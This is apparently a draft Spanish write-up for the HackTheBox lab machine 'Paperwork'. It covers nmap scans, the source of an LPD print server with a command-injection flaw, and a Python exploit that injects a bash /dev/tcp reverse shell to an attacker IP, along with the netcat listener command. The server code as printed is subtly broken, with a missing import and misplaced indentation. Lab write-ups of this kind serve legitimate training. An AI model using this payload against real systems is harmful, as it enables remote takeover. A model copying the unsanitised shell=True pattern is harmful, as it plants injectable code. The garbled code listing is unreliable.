@@ -1,0 +1,234 @@
+---
+title: Paperwork
+description: Máquina Linux de dificultad fácil
+lang: es
+platform: hackthebox
+difficulty: easy
+hints: []
+tags: []
+draft: true
+---
+
+## Enumeration
+
+Escaneo con `nmap` para saber qué puertos están abiertos y qué servicios se están ejecutando en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/paperwork 10.129.52.206
+```
+
+```plaintext
+PORT     STATE SERVICE       REASON
+22/tcp   open  ssh           syn-ack ttl 63
+80/tcp   open  http          syn-ack ttl 63
+1515/tcp open  ifor-protocol syn-ack ttl 63
+```
+
+Escaneo detallado con `nmap` para obtener más información sobre los servicios que están corriendo.
+
+```bash
+nmap -p 22,80,1515 -sCV -oA nmap/openports 10.129.52.206
+```
+
+```plaintext
+PORT     STATE SERVICE        VERSION
+22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http           nginx 1.28.0 (Ubuntu)
+|_http-server-header: nginx/1.28.0 (Ubuntu)
+|_http-title: Intranet | Document Archiving Service
+1515/tcp open  ifor-protocol?
+| fingerprint-strings: 
+|   TerminalServer, TerminalServerCookie: 
+|_    Archive_Printer is ready and printing.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1515-TCP:V=7.99%I=7%D=7/13%Time=6A554E99%P=x86_64-pc-linux-gnu%r(Te
+SF:rminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printin
+SF:g\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20p
+SF:rinting\.\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+El output de `nmap` muestra que se redirecciona al dominio `paperwork.htb`.
+
+Añadir al archivo `/etc/hosts` el dominio `paperwork.htb`
+
+```bash
+echo "paperwork.htb 10.129.52.206" | sudo tee -a /etc/hosts
+```
+
+El sitio web muestra información sobre un servicio de impresión y permite descargar un archivo.
+
+[http://paperwork.htb/](http://paperwork.htb/)
+
+![Website Download ZIP File](@images/posts/writeups/hackthebox/machines/paperwork/web-zip.png)
+
+Al descargar el archivo y descomprimirlo se encuentra que corresponde al servidor del servicio de impresión.
+
+```bash
+unzip paperwork-archive-v1.02.zip
+```
+
+```python
+import socket
+import threading
+import subprocess
+import subprocess
+
+VALID_QUEUE = os.environ.get("LPD_QUEUE")
+
+class LpdHandler(threading.Thread):
+
+    def __init__(self, sock, addr):
+        super().__init__()
+        self.sock = sock
+        self.addr = addr
+        self.id = f"[lpd-{addr[1]}]"
+
+    def run(self):
+        try:
+            data = self.sock.recv(1024)
+            if not data: return
+            
+            command = data[0]
+            
+            if command == 2:
+                self.handle_print_job(data)
+            elif command in (3, 4):
+                self.sock.send(b"Archive_Printer is ready and printing.\n")
+                
+        except Exception as e:
+            print(f"{self.id} Error: {e}")
+        finally:
+            self.sock.close()
+
+    def handle_print_job(self, data):
+        queue = data[1:].decode().strip()
+        
+        if queue not in VALID_QUEUE:
+            print(f"{self.id} Rejected: Invalid queue '{queue}'")
+            self.sock.send(b'\x01') 
+            return
+        print(f"{self.id} Accepted job for queue: {queue}")
+        while True:
+            chunk = self.sock.recv(1024)
+            if not chunk: break
+            
+            subcommand = chunk[0]
+            self.sock.send(b'\x00') 
+                parts = chunk[1:].decode(errors='ignore').split()
+                if not parts: continue
+                
+                size = int(parts[0])
+                content = b""
+                while len(content) < size:
+                    content += self.sock.recv(size - len(content) + 1)
+                
+                decoded_content = content.decode(errors='ignore')
+                
+                job_name = "Unknown"
+                for line in decoded_content.split('\n'):
+                    line = line.strip()
+                    if line.startswith('J'):
+                        job_name = line[1:]
+                        break
+                
+                print(f"{self.id} Executing archive for: {job_name}")
+                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
+                
+                self.sock.send(b'\x00') 
+                self.sock.send(b'\x00')
+                while self.sock.recv(4096):
+                    pass
+                break
+
+class LpdServer:
+
+    def __init__(self, ip='0.0.0.0', port=1515):
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server.bind((ip, port))
+        self.server.listen(100)
+        print(f"[*] LPD Server listening on {port}")
+
+    def run(self):
+        while True:
+            sock, addr = self.server.accept()
+            LpdHandler(sock, addr).start()
+
+if __name__ == "__main__":
+    LpdServer(port=1515).run()
+```
+
+El [RFC 1179](https://datatracker.ietf.org/doc/html/rfc1179) muestra como interactuar con el protocolo. El código indica que se le pueden enviar comandos como `2`, `3` o `4`. El RFC indica que *All commands begin with a single octet code, which is a binary number which represents the requested function.  The code is immediately followed by the ASCII name of the printer queue name on which the function is to be performed.*.
+
+No hace falta enviar el nombre de la cola de impresión, el código ya acepta el comando si envíamos solo el código del octeto que representa la función solicitada. Tal como indica el código recibimos la respuesta del servicio a la función solicitada.
+
+```bash
+printf '\x03' | nc paperwork.htb 1515
+```
+
+```plaintext
+Archive_Printer is ready and printing.
+```
+
+El script que levanta el servidor tiene una vulnerabilidad que permite ejecutar comandos. Recibe un trabajo de impresión enviado por el cliente. Dentro del archivo de control busca una línea que empiece con `J`, todo lo que venga después de `J` se guarda en la variable `job_name`, esa variable se puede controlar y se inserta directamente en un comando del sistema `f"echo 'Archive: {job_name}' >> /tmp/archive.log"` y se ejecuta con `shell=True`.
+
+```python
+job_name = "Unknown"
+for line in decoded_content.split('\n'):
+    line = line.strip()
+    if line.startswith('J'):
+        job_name = line[1:]
+        break
+
+print(f"{self.id} Executing archive for: {job_name}")
+
+subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
+```
+
+Para obtener una reverse shell aprovechando la ejecución de comandos creamos un script en Python
+
+```python
+import argparse
+import socket
+
+parser = argparse.ArgumentParser()
+parser.add_argument("lhost", help="Attacker IP")
+parser.add_argument("lport", type=int, help="Attacker port")
+args = parser.parse_args()
+
+s = socket.create_connection(("paperwork.htb", 1515))
+
+s.sendall(b"\x02archive\n")
+print("queue:", s.recv(1))
+
+payload = (f"J';bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1';#\n").encode()
+
+header = b"\x02" + str(len(payload)).encode() + b" cfA001\n"
+
+s.sendall(header)
+print("header:", s.recv(1))
+
+s.sendall(payload)
+
+s.sendall(b"\x00")
+
+s.settimeout(2)
+try:
+    while True:
+        print("recv:", s.recv(1024))
+except socket.timeout:
+    print("timeout")
+```
+
+Nos ponemos en escucha en la máquina atacante
+
+```bash
+nc -lvnp 1111
+```
+
+Y ejecutamos el script para obtener una reverse shell
+
+```python
+python3 rev.py 10.10.16.99 1111
+```
